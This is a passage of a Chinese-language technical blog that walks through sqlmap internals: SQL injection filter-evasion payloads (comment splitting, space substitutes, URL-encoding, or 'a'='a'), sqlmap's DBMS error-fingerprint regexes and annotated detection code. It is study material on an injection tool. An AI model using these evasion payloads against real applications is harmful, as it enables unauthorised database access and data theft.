class="hljs-comment">/**/</span>ect v$version;<br></code></pre></td></tr></table></figure><p>SP2-0734: unknown command beginning “sel&#x2F;**&#x2F;ect…” - rest of line ignored.</p><h3 id="空格用-替换"><a href="#空格用-替换" class="headerlink" title="空格用+替换"></a>空格用+替换</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> id <span class="hljs-keyword">FROM</span> users <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">SELECT</span><span class="hljs-operator">+</span>id<span class="hljs-operator">+</span><span class="hljs-keyword">FROM</span><span class="hljs-operator">+</span>users<br></code></pre></td></tr></table></figure><h3 id="随机空格替换"><a href="#随机空格替换" class="headerlink" title="随机空格替换"></a>随机空格替换</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> id <span class="hljs-keyword">FROM</span> users <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">SELECT</span>\rid\tFROM\nusers<br></code></pre></td></tr></table></figure><table><thead><tr><th>数据库</th><th>是否支持</th></tr></thead><tbody><tr><td>MSSQL</td><td>支持</td></tr><tr><td>Mysql</td><td>支持</td></tr><tr><td>PostgreSQL</td><td>支持</td></tr><tr><td>Oracle</td><td>支持</td></tr></tbody></table><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">$echo -e &quot;select\t*from\tv\$version;&quot;| sqlplus &quot;/ as sysdba&quot;<br><br>SQL&gt; <br><span class="hljs-section">BANNER</span><br><span class="hljs-section">----------------------------------------------------------------</span><br>Oracle Database 10g Enterprise Edition Release 10.1.0.3.0 - Prod<br>PL/SQL Release 10.1.0.3.0 - Production<br>CORE10.1.0.3.0Production<br>TNS for Linux: Version 10.1.0.3.0 - Production<br>NLSRTL Version 10.1.0.3.0 - Production<br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">echo -e &quot;select\tversion();&quot; | psql -U postgres<br><span class="hljs-section">                                                               version                                                                </span><br><span class="hljs-section">--------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="hljs-code"> PostgreSQL 8.1.4 on i686-pc-linux-gnu, compiled by GCC i686-pc-linux-gnu-gcc (GCC) 3.4.6 (Gentoo 3.4.6-r1, ssp-3.4.5-1.0, pie-8.7.9)</span><br></code></pre></td></tr></table></figure><h3 id="urlencode"><a href="#urlencode" class="headerlink" title="urlencode"></a>urlencode</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> FIELD <span class="hljs-keyword">FROM</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">TABLE</span><span class="hljs-string">&#x27; =&gt; &#x27;</span><span class="hljs-operator">%</span><span class="hljs-number">53</span><span class="hljs-operator">%</span><span class="hljs-number">45</span><span class="hljs-operator">%</span><span class="hljs-number">4</span>c<span class="hljs-operator">%</span><span class="hljs-number">45</span><span class="hljs-operator">%</span><span class="hljs-number">43</span><span class="hljs-operator">%</span><span class="hljs-number">54</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-operator">%</span><span class="hljs-number">46</span><span class="hljs-operator">%</span><span class="hljs-number">49</span><span class="hljs-operator">%</span><span class="hljs-number">45</span><span class="hljs-operator">%</span><span class="hljs-number">4</span>c<span class="hljs-operator">%</span><span class="hljs-number">44</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-operator">%</span><span class="hljs-number">46</span><span class="hljs-operator">%</span><span class="hljs-number">52</span><span class="hljs-operator">%</span><span class="hljs-number">4</span>f<span class="hljs-operator">%</span><span class="hljs-number">4</span>d<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-operator">%</span><span class="hljs-number">54</span><span class="hljs-operator">%</span><span class="hljs-number">41</span><span class="hljs-operator">%</span><span class="hljs-number">42</span><span class="hljs-operator">%</span><span class="hljs-number">4</span>c<span class="hljs-operator">%</span><span class="hljs-number">45</span><span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="between-替换"><a href="#between-替换" class="headerlink" title="between 替换"></a>between 替换</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">A <span class="hljs-operator">&gt;</span> B<span class="hljs-string">&#x27; =&gt; &#x27;</span>A <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">BETWEEN</span> <span class="hljs-number">0</span> <span class="hljs-keyword">AND</span> B<br></code></pre></td></tr></table></figure><h3 id="逃避正则表达式检测"><a href="#逃避正则表达式检测" class="headerlink" title="逃避正则表达式检测"></a>逃避正则表达式检测</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>  使用  <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;a&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="DBMS分析技术"><a href="#DBMS分析技术" class="headerlink" title="DBMS分析技术"></a>DBMS分析技术</h2><h3 id="通过错误信息分析DBMS"><a href="#通过错误信息分析DBMS" class="headerlink" title="通过错误信息分析DBMS"></a>通过错误信息分析DBMS</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- MySQL --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;MySQL&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;SQL syntax.*MySQL&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Warning.*mysql_.*&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;valid MySQL result&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;MySqlClient\.&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dbms</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- PostgreSQL --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;PostgreSQL&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;PostgreSQL.*ERROR&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Warning.*\Wpg_.*&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;valid PostgreSQL result&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Npgsql\.&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dbms</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Microsoft SQL Server --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Microsoft SQL Server&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Driver.* SQL[\-\_\ ]*Server&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;OLE DB.* SQL Server&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;(\W|\A)SQL Server.*Driver&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Warning.*mssql_.*&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;(\W|\A)SQL Server.*[0-9a-fA-F]&#123;8&#125;&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Exception Details:.*\WSystem\.Data\.SqlClient\.&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Exception Details:.*\WRoadhouse\.Cms\.&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dbms</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Microsoft Access --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Microsoft Access&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Microsoft Access Driver&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;JET Database Engine&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Access Database Engine&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dbms</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Oracle --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Oracle&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;ORA-[0-9][0-9][0-9][0-9]&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Oracle error&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Oracle.*Driver&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Warning.*\Woci_.*&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Warning.*\Wora_.*&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dbms</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- DB2 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;DB2&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;CLI Driver.*DB2&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;DB2 SQL error&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dbms</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Informix --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Informix&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Exception.*Informix&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dbms</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Interbase/Firebird --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Firebird&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Dynamic SQL Error&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Warning.*ibase_.*&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dbms</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- SQLite --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;SQLite&quot;</span>&gt;</span>AND &#x27;[RANDSTR]&#x27;=&#x27;[RANDSTR]<br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;SQLite/JDBCDriver&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;SQLite.Exception&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;System.Data.SQLite.SQLiteException&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Warning.*sqlite_.*&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Warning.*SQLite3::&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dbms</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- SAP MaxDB --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;SAP MaxDB&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;SQL error.*POS([0-9]+).*&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Warning.*maxdb.*&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dbms</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Sybase --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Sybase&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Warning.*sybase.*&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Sybase message&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Sybase.*Server message.*&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dbms</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Ingres --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Ingres&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Warning.*ingres_&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Ingres SQLSTATE&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Ingres\W.*Driver&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dbms</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>更详细地需要DBMS fingerprint 识别技术</p><h2 id="检测SQL-Injection-的报文"><a href="#检测SQL-Injection-的报文" class="headerlink" title="检测SQL Injection 的报文"></a>检测SQL Injection 的报文</h2><ol><li>检查参数是否动态</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkDynParam</span>(<span class="hljs-params">place, parameter, value</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    This function checks if the url parameter is dynamic. If it is</span><br><span class="hljs-string">    dynamic, the content of the page differs, otherwise the</span><br><span class="hljs-string">    dynamicity might depend on another parameter.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    kb.matchRatio = <span class="hljs-literal">None</span><br><br>    infoMsg = <span class="hljs-string">&quot;testing if %s parameter &#x27;%s&#x27; is dynamic&quot;</span> % (place, parameter)<br>    logger.info(infoMsg)<br><br>    <span class="hljs-comment"># 生成一个随机字符串</span><br>    randInt = randomInt()<br>    payload = agent.payload(place, parameter, value, getUnicode(randInt))<br>    logger.debug(<span class="hljs-string">&quot;checkDynParam: %s&quot;</span>, payload)<br>    dynResult = Request.queryPage(payload, place, raise404=<span class="hljs-literal">False</span>)<br><br>    <span class="hljs-comment"># 如果和原先页面一样，不是动态参数</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-literal">True</span> == dynResult:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    infoMsg = <span class="hljs-string">&quot;confirming that %s parameter &#x27;%s&#x27; is dynamic&quot;</span> % (place, parameter)<br>    logger.info(infoMsg)<br>    <span class="hljs-comment"># 再次检查，确认</span><br>    randInt = randomInt()<br>    payload = agent.payload(place, parameter, value, getUnicode(randInt))<br>    dynResult = Request.queryPage(payload, place, raise404=<span class="hljs-literal">False</span>)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">not</span> dynResult<br></code></pre></td></tr></table></figure><ol start="2"><li><p>启发式检测，长度为10的 “,’, ), ( 随机字符串， 使用python RandomStr, 如果发生已知错误，报可能存在sql injection， 可能的数据库</p></li><li><p>基于risk 和 level的级别，使用payloads.xml中的报文进行检测</p></li><li><p>判断url连接是否稳定，连续连接url两次，如果返回内容完全相同，则认为url稳定。</p></li><li><p>NullConnection <a href="http://www.wisec.it/sectou.php?id=472f952d79293">http://www.wisec.it/sectou.php?id=472f952d79293</a></p></li></ol><h2 id="怎么判断injected-payload-成功"><a href="#怎么判断injected-payload-成功" class="headerlink" title="怎么判断injected payload 成功"></a>怎么判断injected payload 成功</h2><h3 id="comparison-算法，-boolean-based-blind-SQL-injections"><a href="#comparison-算法，-boolean-based-blind-SQL-injections" class="headerlink" title="comparison 算法， boolean-based blind SQL injections"></a>comparison 算法， boolean-based blind SQL injections</h3><p>使用 difflib.SequenceMatcher, 基于页面相似度如果请求发生错误，所有不正确的请求都认为正确。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">comparison</span>(<span class="hljs-params">page, getRatioValue=<span class="hljs-literal">False</span>, pageLength=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">if</span> page <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> pageLength <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    regExpResults = <span class="hljs-literal">None</span><br><br>    seqMatcher = getCurrentThreadData().seqMatcher<br>    <span class="hljs-comment">#logger.debug(kb.pageTemplate)</span><br>    seqMatcher.set_seq1(kb.pageTemplate)<br><br>    <span class="hljs-keyword">if</span> page:<br>        <span class="hljs-comment"># String to match in page when the query is valid</span><br>        <span class="hljs-comment">#a.1 如果出现指定字符串，返回True</span><br>        <span class="hljs-keyword">if</span> conf.string:<br>            condition = conf.string <span class="hljs-keyword">in</span> page<br>            <span class="hljs-keyword">return</span> condition <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> getRatioValue <span class="hljs-keyword">else</span> (MAX_RATIO <span class="hljs-keyword">if</span> condition <span class="hljs-keyword">else</span> MIN_RATIO)<br><br>        <span class="hljs-comment"># Regular expression to match in page when the query is valid</span><br>        <span class="hljs-comment"># a.2 如果出现指定正则表达式，返回Ture</span><br>        <span class="hljs-keyword">if</span> conf.regexp:<br>            condition = re.search(conf.regexp, page, re.I | re.M) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span><br>            <span class="hljs-keyword">return</span> condition <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> getRatioValue <span class="hljs-keyword">else</span> (MAX_RATIO <span class="hljs-keyword">if</span> condition <span class="hljs-keyword">else</span> MIN_RATIO)<br><br>        <span class="hljs-comment"># In case of an DBMS error page return None</span><br>        <span class="hljs-keyword">if</span> kb.errorIsNone <span class="hljs-keyword">and</span> (wasLastRequestDBMSError() <span class="hljs-keyword">or</span> wasLastRequestHTTPError()):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>        <span class="hljs-comment"># Dynamic content lines to be excluded before comparison</span><br>        <span class="hljs-comment"># a.4 比较前先将两个页面的动态内容移除</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> kb.nullConnection:<br>            page = removeDynamicContent(page)<br>            seqMatcher.set_seq1(removeDynamicContent(kb.pageTemplate))<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> pageLength:<br>            pageLength = <span 